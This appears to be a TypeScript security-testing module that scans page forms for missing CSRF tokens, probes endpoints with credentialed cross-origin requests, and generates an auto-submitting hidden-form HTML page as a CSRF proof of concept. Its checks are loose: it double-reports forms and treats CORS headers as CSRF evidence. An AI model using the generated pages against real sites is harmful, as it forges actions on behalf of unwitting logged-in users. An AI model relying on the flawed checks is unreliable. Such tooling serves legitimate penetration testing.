/**
 * CSRF Vulnerabilities Module
 * Find and exploit Cross-Site Request Forgery vulnerabilities
 */

export interface CSRFVulnerability {
  endpoint: string;
  method: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  protection?: string;
}

export class CSRFScanner {
  /**
   * Scan forms for CSRF protection
   */
  scanForms(): CSRFVulnerability[] {
    const vulnerabilities: CSRFVulnerability[] = [];
    const forms = document.querySelectorAll('form');
    
    forms.forEach((form, index) => {
      const action = (form as HTMLFormElement).action || window.location.href;
      const method = (form as HTMLFormElement).method.toUpperCase() || 'GET';
      
      // Check for CSRF token
      const csrfToken = form.querySelector('input[name*="csrf"], input[name*="token"], input[name*="_token"]');
      
      if (!csrfToken && (method === 'POST' || method === 'PUT' || method === 'DELETE')) {
        vulnerabilities.push({
          endpoint: action,
          method,
          severity: 'high',
          description: `Form ${index} lacks CSRF protection token`,
        });
      }
      
      // Check for SameSite cookie attribute (indirect protection)
      if (!csrfToken) {
        vulnerabilities.push({
          endpoint: action,
          method,
          severity: method === 'GET' ? 'low' : 'high',
          description: `Form ${index} may be vulnerable to CSRF attacks`,
          protection: 'Consider adding CSRF token or SameSite cookie attribute',
        });
      }
    });
    
    return vulnerabilities;
  }

  /**
   * Test if endpoint is vulnerable to CSRF
   */
  async testEndpoint(url: string, method: string = 'POST'): Promise<CSRFVulnerability[]> {
    const vulnerabilities: CSRFVulnerability[] = [];
    
    // Check if endpoint accepts requests from different origins
    try {
      const response = await fetch(url, {
        method,
        mode: 'cors',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ test: 'csrf' }),
      });
      
      // If request succeeds, check for CORS headers
      const corsHeader = response.headers.get('Access-Control-Allow-Origin');
      
      if (corsHeader === '*' || (corsHeader && corsHeader !== window.location.origin)) {
        vulnerabilities.push({
          endpoint: url,
          method,
          severity: 'high',
          description: 'Endpoint allows cross-origin requests without proper CSRF protection',
        });
      }
    } catch (error) {
      // CORS error might indicate protection, but not always
      console.log('CORS error (may indicate protection):', error);
    }
    
    return vulnerabilities;
  }

  /**
   * Generate CSRF proof-of-concept
   */
  generatePOC(endpoint: string, method: string, formData: Record<string, string>): string {
    const formFields = Object.entries(formData)
      .map(([key, value]) => `    <input type="hidden" name="${key}" value="${value}">`)
      .join('\n');
    
    return `<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <form id="csrf-form" action="${endpoint}" method="${method}">
${formFields}
    </form>
    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>`;
  }
}

